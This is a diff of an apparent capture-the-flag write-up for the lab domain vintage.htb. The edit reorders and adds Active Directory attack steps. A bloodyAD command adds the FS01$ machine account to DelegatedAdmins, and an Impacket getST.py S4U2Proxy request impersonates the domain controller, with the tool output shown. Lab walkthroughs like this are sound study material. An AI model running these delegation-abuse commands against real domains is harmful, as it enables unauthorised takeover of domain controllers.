@@ -401,6 +401,14 @@ SMB         dc01.vintage.htb 445    dc01             [+] Run the following comma
 export KRB5CCNAME=c.neri_adm.ccache
 ```
 
+
+```python
+bloodyAD -k --host dc01.vintage.htb -d vintage.htb add groupMember 'DelegatedAdmins' 'FS01$'
+
+[+] FS01$ added to DelegatedAdmins
+```
+This added the user to the group
+
 Also ill make a new ticket as `FS01$`:
 ```python
 nxc smb dc01.vintage.htb -u 'fs01$' -p 'fs01' --generate-tgt fs01 -k
@@ -412,12 +420,11 @@ SMB         dc01.vintage.htb 445    dc01             [+] Run the following comma
 Now i have all the TGTs i can add `FS01$` to the `DelegatedAdmins` group
 
 ```python
-bloodyAD -k --host dc01.vintage.htb -d vintage.htb add groupMember 'DelegatedAdmins' 'FS01$'
+KRB5CCNAME=fs01.ccache getST.py -spn 'cifs/dc01.vintage.htb' -impersonate 'dc01$' 'vintage.htb/fs01$:fs01' -dc-ip dc01.vintage.htb
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
 
-[+] FS01$ added to DelegatedAdmins
-```
-This added the user to the group
-
-```python
-
+[*] Impersonating dc01$
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in dc01$@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache
 ```
